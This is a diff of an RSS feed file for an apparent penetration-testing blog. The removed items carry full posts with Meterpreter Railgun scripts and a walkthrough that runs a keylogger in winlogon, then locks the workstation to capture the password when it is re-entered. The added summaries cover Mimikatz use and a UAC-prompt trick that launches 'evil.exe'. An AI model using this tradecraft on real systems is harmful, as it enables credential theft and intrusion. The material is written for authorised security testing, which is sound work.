-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;shell32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;functions&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;IsUserAnAdmin&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;       
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print_status &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Adding the IsUserAnAdmin function&amp;#34;&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_function(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;shell32&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;IsUserAnAdmin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BOOL&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;)        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print_status &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;IsUserAnAdmin already loaded.. skipping&amp;#34;&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print_status &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Running the IsUserAnAdmin function&amp;#34;&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;status &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;shell32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;IsUserAnAdmin()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; status&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;return&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;       
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print_status &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You are an administrator&amp;#34;&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print_error &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You are not an administrator&amp;#34;&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
-    </item>
-    
-    <item>
-      <title>Resources for railgun development</title>
-      <link>https://malicious.link/post/2010/2010-08-03-resources-for-railgun-development/</link>
-      <pubDate>Tue, 03 Aug 2010 14:19:52 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-08-03-resources-for-railgun-development/</guid>
-      <description>&lt;p&gt;Metasploit&amp;rsquo;s Railgun is awesome, but getting things to work correctly can be a pain. Here are some of the resources that have helped me out:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;a href=&#34;%22http://msdn.microsoft.com/en-us/library/ms681381(VS.85).aspx%22&#34;&gt;System Error Codes&lt;/a&gt; - This is hands down the best resource you have, it will tell you what that stupid &amp;ldquo;5&amp;rdquo; or &amp;ldquo;1314&amp;rdquo; means in your return value. Keep this tab open to circumvent crazed bovine attacks.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;a href=&#34;http://www.winprog.org/tutorial/&#34;&gt;theForger&amp;rsquo;s Win32 API Programming Tutorial&lt;/a&gt; - A really good place to start when you are getting to know the Windows API and the frustrations that come along with it. I highly recommend going through it first.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;a href=&#34;http://msdn.microsoft.com/en-us/library/aa383749&#34;&gt;MS Windows API Reference&lt;/a&gt; - Gigantic, and not the easiest to navigate, but really good for knowing what calls were added with each version of Windows as well as a basic (alphabetic) list of calls. Good if you know where you are going.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;a href=&#34;http://undocumented.ntinternals.net/&#34;&gt;The Undocumented Functions - Win NT/2k/XP/2k3&lt;/a&gt; - A really old link but has good references to undocumented functions that have helped circumvent some of the stupidity of other more complicated functions.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;a href=&#34;http://source.winehq.org/WineAPI/&#34;&gt;WineAPI Documentation&lt;/a&gt; - A great resource of API calls that mimic the Microsoft ones (Undocumented and Documented).&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Hope this helps and I look forward to seeing what you come up with&amp;hellip;&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Intro to RailGun: WIN API for Meterpreter</title>
-      <link>https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</link>
-      <pubDate>Thu, 08 Jul 2010 02:10:34 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</guid>
-      <description>&lt;p&gt;Back on June 13th, &amp;ldquo;Patrick HVE&amp;rdquo; released RAILGUN:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;http://mail.metasploit.com/pipermail/framework/2010-June/006382.html&#34;&gt;http://mail.metasploit.com/pipermail/framework/2010-June/006382.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712:
-&lt;a href=&#34;http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712&#34;&gt;http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;iphlpapi&lt;/li&gt;
-&lt;li&gt;ws2_32&lt;/li&gt;
-&lt;li&gt;kernel32&lt;/li&gt;
-&lt;li&gt;ntdll&lt;/li&gt;
-&lt;li&gt;user32&lt;/li&gt;
-&lt;li&gt;advapi32&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;(You can find out exactly what functions are available by default in the api.rb file)&lt;/p&gt;
-&lt;p&gt;It&amp;rsquo;s also very extensible, it doesn&amp;rsquo;t have a DLL or function you need? But you can read all about in the manual:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;./external/source/meterpreter/source/extensions/railgun/railgun_manual.pdf&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Here are two examples where this comes in very handy:&lt;/p&gt;
-&lt;h2 id=&#34;list-drives&#34;&gt;List Drives:&lt;/h2&gt;
-&lt;p&gt;The problem that I&amp;rsquo;ve had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;net use - Shows you what Network drives are connected, but not physical ones&lt;/li&gt;
-&lt;li&gt;fsutil fsinfo drives - You must be an administrator to ride this train&lt;/li&gt;
-&lt;li&gt;fdisk /status - Only on OLD versions of DOS, not sure when this disappeared&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;But railgun solves this problem with a really short script:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Load the Railgun plugin  **_Update: You no longer need this step_**  &lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# client.core.use(&amp;#34;railgun&amp;#34;)   &lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Make the API call to enum drive letters   &lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GetLogicalDrives()&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;return&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Math magic to convert the binary to letters        &lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drives &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;letters &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; letters&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;i,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	rem &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;(i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; rem &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		drives &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; test        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; rem        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print_line(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Drives Available = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;drives&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inspect&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;: &lt;code&gt;Drives Available = [&amp;quot;A&amp;quot;, &amp;quot;C&amp;quot;, &amp;quot;D&amp;quot;, &amp;quot;P&amp;quot;, &amp;quot;X&amp;quot;]&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Save this as a meterpreter script and it&amp;rsquo;ll print every logical drive attached to the system even as a limited user (that the user can see).&lt;/p&gt;
-&lt;p&gt;Logical drives include: (hdd, network, mass storage, optical, etc). This opens up the doors to infecting USB sticks and network drives…&lt;/p&gt;
-&lt;h2 id=&#34;jedi-keylogging&#34;&gt;JEDI KEYLOGGING:&lt;/h2&gt;
-&lt;p&gt;One of the problems with keylogging is you never know when that person will log in, and if you&amp;rsquo;re using a client side, they have probably already logged in and you&amp;rsquo;re hoping they log into a portal or some other password protected site.&lt;/p&gt;
-&lt;p&gt;Railgun to the rescue again:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon**   &lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;meterpreter &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; bgrun keylogrecorder &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;t &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Executed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Meterpreter&lt;/span&gt; with &lt;span style=&#34;color:#66d9ef&#34;&gt;Job&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ID&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;meterpreter &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; winlogon&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exe &lt;span style=&#34;color:#66d9ef&#34;&gt;Process&lt;/span&gt; found, migrating into &lt;span style=&#34;color:#ae81ff&#34;&gt;640&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Migration&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Successful&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Starting&lt;/span&gt; the keystroke sniffer&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Keystrokes&lt;/span&gt; being saved &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; to &lt;span style=&#34;color:#e6db74&#34;&gt;/root/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;msf3&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;logs&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;scripts&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;keylogrecorder&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;192&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;168&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;122_20100707&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4539&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;txt        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Recording&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.**&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;meterpreter &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; irb       
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Starting&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;IRB&lt;/span&gt; shell        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;The&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;client&amp;#39;&lt;/span&gt; variable holds the meterpreter client
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;core&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;use(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;railgun&amp;#34;&lt;/span&gt;)       
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;user32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;LockWorkStation()        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GetLastError&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;return&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;}        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exit        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;meterpreter &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Set up &amp;ldquo;tail -f&amp;rdquo; going on the log file for the keylogger and then kill the keylogger when you&amp;rsquo;ve gotten what you came for.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; bglist       
-[*] Job 0: [&amp;#34;keylogrecorder&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;1&amp;#34;, &amp;#34;-t&amp;#34;, &amp;#34;15&amp;#34;]        
-meterpreter &amp;gt; bgkill 0        
-[*] Killing background job 0...        
-meterpreter &amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hope you have fun with railgun and shoot me an email &lt;a href=&#34;mailto:mubix@hak5.org&#34;&gt;mubix@hak5.org&lt;/a&gt; or leave a comment if you have any other crazy uses for railgun.&lt;/p&gt;
-</description>
-    </item>
-    
-  </channel>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>railgun - Category - Malicious Link - Blog by mubix - Rob Fuller</title>
+        <link>https://malicious.link/categories/railgun/</link>
+        <description>railgun - Category - Malicious Link - Blog by mubix - Rob Fuller</description>
+        <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>mubix@hak5.org (Rob Fuller)</managingEditor>
+            <webMaster>mubix@hak5.org (Rob Fuller)</webMaster><lastBuildDate>Tue, 31 Jul 2012 20:20:15 &#43;0000</lastBuildDate><atom:link href="https://malicious.link/categories/railgun/" rel="self" type="application/rss+xml" /><item>
+    <title>Raising Zombies in Windows: Part 1 - Passwords</title>
+    <link>https://malicious.link/posts/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</link>
+    <pubDate>Tue, 31 Jul 2012 20:20:15 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</guid>
+    <description><![CDATA[With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&rsquo;t really appreciative of our (pentester/red teamer)&rsquo;s schedule.
+A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &lsquo;runas.exe&rsquo;:
+w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&rsquo;re good right?]]></description>
+</item>
+<item>
+    <title>Integration of Mimikatz into Metasploit Stage1</title>
+    <link>https://malicious.link/posts/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</link>
+    <pubDate>Fri, 15 Jun 2012 14:55:55 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</guid>
+    <description><![CDATA[One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
+Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked.]]></description>
+</item>
+<item>
+    <title>(UAC) User Assisted Compromise</title>
+    <link>https://malicious.link/posts/2012/2012-01-03-uac-user-assisted-compromise/</link>
+    <pubDate>Tue, 03 Jan 2012 06:56:22 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2012/2012-01-03-uac-user-assisted-compromise/</guid>
+    <description><![CDATA[A number of times during tests I&rsquo;ve actually run into those mythical creatures called &ldquo;patched windows machines&rdquo;. At DerbyCon Chris Gates and I released the &ldquo;Ask&rdquo; post module (which I had failed to publish). This module very simply uses the ShellExecute windows function via Railgun with the undocumented (but very well known) operator of &lsquo;runas&rsquo;. These two lines accomplished that:
+client.railgun.add_function( 'shell32', 'ShellExecuteA', 'DWORD',[[&quot;DWORD&quot;,&quot;hwnd&quot;,&quot;in&quot;],[&quot;PCHAR&quot;,&quot;lpOperation&quot;,&quot;in&quot;],[&quot;PCHAR&quot;,&quot;lpFile&quot;,&quot;in&quot;],[&quot;PCHAR&quot;,&quot;lpParameters&quot;,&quot;in&quot;],[&quot;PCHAR&quot;,&quot;lpDirectory&quot;,&quot;in&quot;],[&quot;DWORD&quot;,&quot;nShowCmd&quot;,&quot;in&quot;],]) client.railgun.shell32.ShellExecuteA(nil,&quot;runas&quot;,&quot;evil.exe&quot;,nil,nil,5) This would quite simply prompt the user with that annoying UAC prompt asking the user to run &rsquo;evil.]]></description>
+</item>
+<item>
+    <title>IP Resolution Using Meterpreter’s Railgun</title>
+    <link>https://malicious.link/posts/2011/2011-08-19-ip-resolution-using-meterpreters-railgun/</link>
+    <pubDate>Fri, 19 Aug 2011 19:26:55 &#43;0000</pubDate>
+    <author>mubix</author>
